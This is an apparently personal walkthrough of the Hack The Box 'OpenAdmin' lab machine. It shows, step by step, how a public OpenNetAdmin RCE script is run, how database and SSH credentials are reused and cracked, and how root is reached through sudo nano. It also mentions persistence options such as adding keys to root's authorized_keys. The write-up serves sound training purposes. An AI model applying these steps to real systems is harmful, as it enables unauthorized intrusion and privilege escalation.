---
title: "OpenAdmin Walkthrough - HTB Easy | OpenNetAdmin RCE & Nano Privilege Escalation"
description: "Complete walkthrough of OpenAdmin from Hack The Box. Covers OpenNetAdmin 18.1.1 command injection exploitation, database credential reuse, internal web application enumeration, SSH key cracking with john, and nano sudo privilege escalation via GTFOBins."
author: dua2z3rr
date: 2025-12-09 1:00:00
categories: [HackTheBox, Machines]
tags: ["web-application", "vulnerability-assessment", "injections", "software-and-os-exploitation", "cryptography", "authentication", "local-file-inclusion", "weak-credentials", "os-command-injection", "directory-traversal", "hardcoded-credentials", "ssh", "openadmin", "reconnaissance", "web-site-structure-discovery", "pivoting", "tunneling", "password-reuse", "password-cracking", "sudo-exploitation"]
image: /assets/img/openAdmin/openAdmin-resized.png
---

## Overview

OpenAdmin is an easy-difficulty Linux machine from Hack The Box featuring an outdated OpenNetAdmin CMS installation. The box demonstrates credential reuse, internal application enumeration, and sudo misconfiguration exploitation. After gaining initial access through a known vulnerability, lateral movement is achieved through password reuse and SSH key cracking, ultimately leading to root access via a nano sudo misconfiguration.

---

## External Enumeration

### Nmap Scan

Starting with a comprehensive port scan:

```shell
┌─[dua2z3rr@parrot]─[~]
└──╼ $nmap openadmin.htb -vv -p- -sC -sV
<SNIP>
PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 4b:98:df:85:d1:7e:f0:3d:da:48:cd:bc:92:00:b7:54 (RSA)
|   256 dc:eb:3d:c9:44:d1:18:b1:22:b4:cf:de:bd:6c:7a:54 (ECDSA)
|   256 dc:ad:ca:3c:11:31:5b:6f:e6:a4:89:34:7c:9b:e5:50 (ED25519)
80/tcp open  http    syn-ack Apache httpd 2.4.29 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
| http-methods: 
|_  Supported Methods: GET POST OPTIONS HEAD
|_http-server-header: Apache/2.4.29 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

**Key findings:**
- SSH (OpenSSH 7.6p1)
- Apache 2.4.29 web server

---

## Web Application Analysis

### Initial Web Page

Accessing the website reveals the default Apache2 Ubuntu installation page:

![Apache default page](/assets/img/openAdmin/openAdmin-1.png)

### Directory Enumeration

Using ffuf to discover hidden directories:

```shell
┌─[dua2z3rr@parrot]─[~]
└──╼ $ffuf -w SecLists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-big.txt -u http://openadmin.htb/FUZZ -ic

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

                        [Status: 200, Size: 10918, Words: 3499, Lines: 376]
music                   [Status: 301, Size: 314, Words: 20, Lines: 10]
artwork                 [Status: 301, Size: 316, Words: 20, Lines: 10]
sierra                  [Status: 301, Size: 315, Words: 20, Lines: 10]
```

**Directories discovered:** `/music`, `/artwork`, `/sierra`

### Music Directory

Exploring `/music` reveals a music-themed website:

![Music website](/assets/img/openAdmin/openAdmin-2.png)

**Key finding:** Clicking the "Login" button redirects to `/ona/` directory

### OpenNetAdmin Discovery

The `/ona/` directory reveals an OpenNetAdmin installation:

![OpenNetAdmin dashboard](/assets/img/openAdmin/openAdmin-3.png)

**Version identified:** OpenNetAdmin v18.1.1

---

## Exploitation

### Searching for Exploits

First, checking Metasploit for available modules:

```shell
[msf](Jobs:0 Agents:0) >> search OpenNetAdmin

Matching Modules
================

   #  Name                                                 Disclosure Date  Rank       Check  Description
   -  ----                                                 ---------------  ----       -----  -----------
   0  exploit/unix/webapp/opennetadmin_ping_cmd_injection  2019-11-19       excellent  Yes    OpenNetAdmin Ping Command Injection
```

**Issue:** The Metasploit module doesn't work reliably on this target.

### Alternative Exploit

Using searchsploit to find other exploits:

```shell
┌─[✗]─[dua2z3rr@parrot]─[~]
└──╼ $searchsploit OpenNetAdmin
-------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                              |  Path
-------------------------------------------------------------------------------------------- ---------------------------------
OpenNetAdmin 13.03.01 - Remote Code Execution                                               | php/webapps/26682.txt
OpenNetAdmin 18.1.1 - Command Injection Exploit (Metasploit)                                | php/webapps/47772.rb
OpenNetAdmin 18.1.1 - Remote Code Execution                                                 | php/webapps/47691.sh
-------------------------------------------------------------------------------------------- ---------------------------------
```

**Exploit selected:** `47691.sh` (OpenNetAdmin 18.1.1 RCE)

### Gaining Initial Access

Executing the exploit:

```bash
┌─[dua2z3rr@parrot]─[~]
└──╼ $/snap/searchsploit/542/opt/exploitdb/exploits/php/webapps/47691.sh http://10.10.10.171/ona/
$ whoami
www-data
```

**Initial foothold achieved** as `www-data`

---

## Database Credential Discovery

### Configuration File Analysis

Examining the OpenNetAdmin configuration:

```bash
$ cat local/config/database_settings.inc.php    
<?php

$ona_contexts=array (
  'DEFAULT' => 
  array (
    'databases' => 
    array (
      0 => 
      array (
        'db_type' => 'mysqli',
        'db_host' => 'localhost',
        'db_login' => 'ona_sys',
        'db_passwd' => 'n1nj4W4rri0R!',
        'db_database' => 'ona_default',
        'db_debug' => false,
      ),
    ),
    'description' => 'Default data context',
    'context_color' => '#D3DBFF',
  ),
);
```

**Credentials discovered:** `ona_sys:n1nj4W4rri0R!`

### User Enumeration

```sh
$ ls /home
jimmy
joanna
```

**Two users identified:** `jimmy` and `joanna`

### Credential Reuse

Testing the database password with SSH:

```sh
$ ssh jimmy@openadmin.htb
jimmy@openadmin.htb's password: n1nj4W4rri0R!
Welcome to Ubuntu 18.04.3 LTS
```

**Lateral movement successful** to user `jimmy`

---

## Internal Application Discovery

### Network Enumeration

Checking for internal services:

```sh
jimmy@openadmin:~$ netstat -ln
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State      
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN     
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN     
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN     
tcp        0      0 127.0.0.1:52846         0.0.0.0:*               LISTEN     
tcp6       0      0 :::80                   :::*                    LISTEN     
tcp6       0      0 :::22                   :::*                    LISTEN
```

**Discovery:** Internal web service running on port `52846`

### Port Forwarding

Forwarding the internal port to access it locally:

```sh
ssh jimmy@10.10.10.171 -L 8080:localhost:52846
```

### Internal Application

Accessing the forwarded port reveals a login panel:

![Internal application login](/assets/img/openAdmin/openadmin-4.png)

### Source Code Analysis

Examining the web application files:

```sh
jimmy@openadmin:/var/www/internal$ ls -al
total 20
drwxrwx--- 2 jimmy internal 4096 Dec  9 20:50 .
drwxr-xr-x 4 root  root     4096 Nov 22  2019 ..
-rwxrwxr-x 1 jimmy internal 3229 Nov 22  2019 index.php
-rwxrwxr-x 1 jimmy internal  185 Nov 23  2019 logout.php
-rwxrwxr-x 1 jimmy internal  339 Nov 23  2019 main.php
```

Examining `main.php`:

```php
<?php session_start(); if (!isset ($_SESSION['username'])) { header("Location: /index.php"); }; 
# Open Admin Trusted
# OpenAdmin
$output = shell_exec('cat /home/joanna/.ssh/id_rsa');
echo "<pre>$output</pre>";
?>
<html>
<h3>Don't forget your "ninja" password</h3>
Click here to logout <a href="logout.php" tite = "Logout">Session
</html>
```

**Important findings:**
1. The page displays Joanna's SSH private key
2. Reference to "ninja" password (potential credential hint)

---

## Authentication Bypass

### Hardcoded Hash Discovery

Examining `index.php` reveals a hardcoded SHA-512 hash:

```php
if ($_POST['username'] == 'jimmy' && hash('sha512',$_POST['password']) == '00e302ccdcf1c60b8ad50ea50cf72b939705f49f40f0dc658801b4680b7d758eebdc2e9f9ba8ba3ef8a8bb9a796d34ba2e856838ee9bdde852b8ec3b3a0523b1') {
    $_SESSION['username'] = 'jimmy';
    header("Location: /main.php");
```

### Hash Cracking

Using CrackStation to crack the SHA-512 hash:

![CrackStation result](/assets/img/openAdmin/openAdmin-5.png)

**Password cracked:** `Revealed`

### Accessing SSH Key

Logging into the internal application with credentials `jimmy:Revealed` and accessing `/main.php`:

![Joanna's SSH private key](/assets/img/openAdmin/openAdmin-6.png)

**Joanna's encrypted SSH private key obtained**

---

## SSH Key Cracking

### Preparing the Key

The SSH private key is encrypted and requires a passphrase. Using `ssh2john` to extract the hash:

```sh
┌─[dua2z3rr@parrot]─[~]
└──╼ $ssh2john rsa > hash.txt
```

### Cracking with John

```sh
┌─[dua2z3rr@parrot]─[~]
└──╼ $john hash.txt --wordlist=rockyou.txt 
Using default input encoding: UTF-8
Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
Cost 2 (iteration count) is 1 for all loaded hashes
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
bloodninjas      (rsa)     
1g 0:00:00:02 DONE (2025-12-09 22:48) 0.3968g/s 3799Kp/s 3799Kc/s 3799KC/s
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

**SSH key passphrase:** `bloodninjas`

### SSH Access as Joanna

```sh
┌─[dua2z3rr@parrot]─[~]
└──╼ $chmod 600 rsa
┌─[dua2z3rr@parrot]─[~]
└──╼ $ssh -i rsa joanna@openadmin.htb
Enter passphrase for key 'rsa': bloodninjas
Welcome to Ubuntu 18.04.3 LTS

joanna@openadmin:~$
```

**User flag obtained** from `/home/joanna/user.txt`

---

## Privilege Escalation

### Sudo Permissions

Checking sudo privileges:

```sh
joanna@openadmin:/opt$ sudo -l
Matching Defaults entries for joanna on openadmin:
    env_keep+="LANG LANGUAGE LINGUAS LC_* _XKB_CHARSET", env_keep+="XAPPLRESDIR XFILESEARCHPATH XUSERFILESEARCHPATH",
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, mail_badpass

User joanna may run the following commands on openadmin:
    (ALL) NOPASSWD: /bin/nano /opt/priv
```

**Critical finding:** User can execute `nano` as root without a password

### Exploiting Nano

According to [GTFOBins](https://gtfobins.github.io/gtfobins/nano/#sudo), nano can be exploited for privilege escalation:

1. Execute: `sudo /bin/nano /opt/priv`
2. Inside nano, press `Ctrl+R` then `Ctrl+X`
3. Execute commands as root

**Method 1 - Read root flag directly:**
```
Command to execute: cat /root/root.txt
```

**Method 2 - Spawn root shell:**
```
Command to execute: /bin/bash
```

**Root flag obtained.** Box completed.

---

## Reflections

### What Surprised Me

The multi-layered lateral movement in this box was excellently designed. I expected the typical "exploit → privesc" path, but instead encountered: RCE → credential reuse (jimmy) → internal web app → hardcoded hash → SSH key → key cracking (joanna) → sudo nano → root. Each step felt realistic. This is how I expect a real penetration test to unfold. Database credentials being reused for system accounts is something I've seen multiple times in production environments, and it never stops surprising me how common this is.

### Main Mistake

I wasted nearly 45 minutes trying to brute-force the internal web application login before examining the source code. I tried common credentials, variations of "ninja", even attempted SQL injection—all while the SHA-512 hash was sitting right there in `index.php`. This taught me a critical lesson: **always read the source code before attempting to brute-force authentication**. If you have filesystem access (like we did as jimmy), source code analysis should be your first step, not your last resort.

### Alternative Approaches

For the nano privilege escalation, instead of just reading the root flag, I could have: added my SSH key to root's `authorized_keys` for persistent access or modified `/etc/sudoers` to give joanna full sudo rights.

### Open Question

The internal web application on port 52846 was only accessible from localhost, which is a common security practice. But how effective is this really? In this case, once we had SSH access as jimmy, port forwarding made it trivial to access. What's the proper way to secure internal applications in production environments—is it just defense in depth (localhost binding + authentication + encrypted keys), or are there better architectural patterns? I'm curious how enterprise environments handle internal admin panels that need to be both secure and accessible.

---

**Completed this box? What was your approach to discovering the internal web application?** Leave a comment down below! I'd love to discuss alternative exploitation paths!
